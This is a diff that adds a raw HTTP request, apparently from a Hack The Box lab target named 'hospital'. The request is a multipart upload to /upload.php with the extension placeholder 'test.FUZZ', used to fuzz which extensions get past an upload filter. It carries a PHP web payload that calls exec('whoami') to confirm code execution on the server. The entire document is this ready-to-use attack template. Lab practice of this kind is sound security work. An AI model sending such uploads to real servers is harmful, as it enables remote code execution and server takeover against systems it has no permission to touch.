@@ -1,0 +1,21 @@
+POST /upload.php HTTP/1.1
+Host: hospital.htb0:8080
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------212489875925627887811593871080
+Content-Length: 264
+Cookie: PHPSESSID=2c347g0o4irpjeltbopuogtttt
+
+-----------------------------212489875925627887811593871080
+Content-Disposition: form-data; name="image"; filename="test.FUZZ"
+Content-Type: application/x-php
+
+<?php
+
+echo exec('whoami');
+
+?> 
+
+
+-----------------------------212489875925627887811593871080--
